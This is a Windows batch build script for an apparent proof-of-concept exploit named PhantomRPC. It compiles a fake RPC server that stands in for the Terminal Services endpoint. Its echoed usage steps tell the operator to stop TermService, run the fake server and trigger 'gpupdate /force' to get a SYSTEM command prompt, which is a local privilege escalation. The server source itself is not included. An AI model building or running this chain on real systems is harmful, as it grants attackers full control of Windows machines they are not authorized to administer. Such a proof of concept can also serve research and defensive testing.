@echo off
:: Build script for PhantomRPC TERM POC
:: Requires: Visual Studio Build Tools (cl.exe, midl.exe) on PATH
:: Run from a VS Developer Command Prompt

echo [*] Compiling IDL...
midl ExampleInterface.idl /app_config
if errorlevel 1 (echo [-] MIDL failed & exit /b 1)

echo [*] Compiling server...
cl.exe server.c ExampleInterface_s.c ^
    /nologo /W3 /O2 ^
    /link rpcrt4.lib advapi32.lib userenv.lib wtsapi32.lib
if errorlevel 1 (echo [-] Compilation failed & exit /b 1)

echo [+] Build successful: server.exe
echo.
echo Usage:
echo   1. Stop TermService:   sc stop TermService
echo   2. Run the fake server: server.exe
echo   3. Trigger:            gpupdate /force
echo   4. A SYSTEM cmd.exe will appear on the console.
echo   5. Restart TermService: sc start TermService
